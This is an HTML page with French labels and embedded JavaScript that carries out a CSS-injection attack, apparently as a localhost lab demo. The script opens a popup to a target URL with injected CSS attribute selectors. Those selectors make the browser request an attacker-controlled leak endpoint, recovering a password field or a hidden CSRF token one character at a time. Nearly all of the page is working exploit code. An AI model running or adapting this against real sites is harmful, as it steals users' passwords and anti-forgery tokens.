<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Attribute Selector</title>
        <style>
            #current {
                font-size: 32px;
                color: red;
            }

            #time_to_next {
                font-size: 24px;
                color: black;
            }
            #password_attack {
                border: 2px solid black;
                padding: 10px;
                cursor: pointer;
            }
            #hidden_attack {
                border: 2px solid black;
                padding: 10px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <h1>Récupération de la valeur d'un attribut d'un élément HTML via les Popups</h1>

        <div id="current"></div>
        <div id="time_to_next"></div>
        <p id="password_attack">Cliquer ici pour commencer l'attaque et retrouver la valeur du champ mot de passe.</p>
        <script>
            // A click on the page from the victim avoids the blocking of popups by the browser
            const p_attack = document.getElementById('password_attack');
            p_attack.addEventListener('click', () => {
                test_char(false);
            });
        </script>
        <p id="hidden_attack">Cliquer ici pour commencer l'attaque et retrouver la valeur du champ caché.</p>
        <script>
            // A click on the page from the victim avoids the blocking of popups by the browser
            const h_attack = document.getElementById('hidden_attack');
            h_attack.addEventListener('click', () => {
                test_char(true);
            });
        </script>

        <script>
            /* ==== CONFIG ==== */
            const RHOST = "http://127.0.0.1"
            const RURL = "/index.php?color=";  
            const LHOST = "http://127.0.0.1:81"
            const LURL_KNOWNCHARS = "/knownChars.php";
            const LURL_LEAKCHAR = "/leak.php?char=";
            const HTML_ELEMENT_NAME = "input";
            const HTML_ATTRIBUTE_NAME = "name";
            const PREFIX = "red;}";
            /********************/

            // Browsers will open only one popup and block the others
            // No UPPER case to avoir URI too long
            const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789_-".split("");

            known = "";
            target_time = new Date();
            timer = 0; 

            function test_char(type) {
                // Append the chars with the known chars
                css = build_css(type, CHARS.map(v => known + v));

                // Create a popup to try the attack even if iframing is not possible
                // widht and heigh = 100 is the minimum size
                var popup = window.open("", "popup", "width=100,height=100");
                var popup = window.open(RHOST + RURL + PREFIX + css, "popup", "width=100,height=100");
                popup.blur();
                
                clearInterval(timer);
                target_time = new Date();
                target_time.setSeconds(target_time.getSeconds() + 1);
                timer = setInterval(function() {
                    var current_time = new Date();
                    diff = target_time - current_time;
                    document.getElementById("time_to_next").innerHTML = "Time to next reload: " + diff / 1000;
                }, 50);
            
                // in 1 seconds, after the iframe loads, check to see if we got a response yet
                setTimeout(function() {
                    var oReq = new XMLHttpRequest();
                    oReq.addEventListener("load", function known_listener() {
                        document.getElementById("current").innerHTML = "Current retrieved data: " + this.responseText;
                        if(known != this.responseText) {
                            known = this.responseText;
                            test_char(type);
                        } else {
                            known = this.responseText;
                            alert("Retrieved data is: " + known);
                        }
                    });
                    oReq.open("GET", LHOST + LURL_KNOWNCHARS);
                    oReq.send();
                }, 1000);
            }

            function build_css(type, values) {
                css_payload = "";
                const isHiddenTypeElement = type;

                for(var value in values) {      
                    if(isHiddenTypeElement) {
                        
                        HTML_ATTRIBUTE_VALUE = "csrf-token";
                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
                        + values[value]
                        + "]~*{background-image:url(" + LHOST + LURL_LEAKCHAR 
                        + values[value]
                        + ")%3B}";
                    }
                    else {
                        HTML_ATTRIBUTE_VALUE = "password";
                        css_payload += "" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
                        + values[value]
                        + "]{background-image:url(" + LHOST + LURL_LEAKCHAR 
                        + values[value]
                        + ")%3B}";
                    }
                }
                return css_payload;
            }
        </script>
    </body>
</html>